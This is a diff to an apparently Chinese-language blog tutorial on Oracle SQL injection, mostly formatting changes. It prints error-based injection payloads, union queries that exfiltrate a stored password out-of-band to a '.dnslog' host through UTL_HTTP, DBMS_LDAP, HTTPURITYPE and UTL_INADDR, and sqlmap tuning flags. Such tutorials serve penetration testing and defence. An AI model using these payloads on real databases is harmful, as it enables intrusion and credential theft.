@@ -129,6 +129,7 @@ select USER_ID from TB_USER where USER_ID=1 and rownum=1（获取数据）
 </ul>
 <pre><code class="language-sql">
 # 中间为查询语句
+
 upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62)))
 
 </code></pre>
@@ -137,6 +138,7 @@ upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62)))
 </ul>
 <pre><code class="language-sql">
 # 中间为查询语句
+
 upper(dbms_xdb_version.checkin((select user from dual)))
 
 </code></pre>
@@ -210,22 +212,23 @@ select column_name, data_type from user_tab_columns where table_name = 'table_na
 <ul>
 <li>DSNlog请求外带数据</li>
 </ul>
-<pre><code class="language-sql">[UTL_HTTP.REQUEST]
+<pre><code class="language-sql">
+- UTL_HTTP.REQUEST
 
 select name from test_user where id =1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.dnslog') FROM sys.DUAL;
 
-[DBMS_LDAP.INIT]
+- DBMS_LDAP.INIT
 
 select name from test_user where id =1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.dnslog',80) FROM sys.DUAL;
 
 
-[HTTPURITYPE] 
+- HTTPURITYPE 
 
 select name from test_user where id =1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.dnslog').GETCLOB() FROM sys.DUAL;
 
 
 
-[UTL_INADDR.GET_HOST_ADDRESS] 
+- UTL_INADDR.GET_HOST_ADDRESS 
 
 select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.dnslog') FROM sys.DUAL;
 </code></pre>
@@ -272,8 +275,8 @@ and+1=(select decode(substr((select table_name from user_tables where rownum=1),
 <li>过滤空格，Json包注入，抓包标记注入点</li>
 <li>因为Sqlmap对于页面差异小布尔判断不准确，所以注入时加上以下任一参数，配合Tamper脚本即可注入成功：</li>
 </ol>
-<p>** --string=STRING    查询时有效时在页面匹配字符串**<br>
-** --not-string=NOT..  当查询求值为无效时匹配的字符串**</p>
+<p><strong>--string=STRING    查询时有效时在页面匹配字符串</strong><br>
+<strong>--not-string=NOT..  当查询求值为无效时匹配的字符串</strong></p>
 <figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200713213422.png" alt="image-20200713213422628" loading="lazy"></figure>
 <ol>
 <li>或者通过国产的一个工具：<strong>超级SQL注入工具</strong>标记好数据包以及布尔变换和空格替换，都可以成功</li>
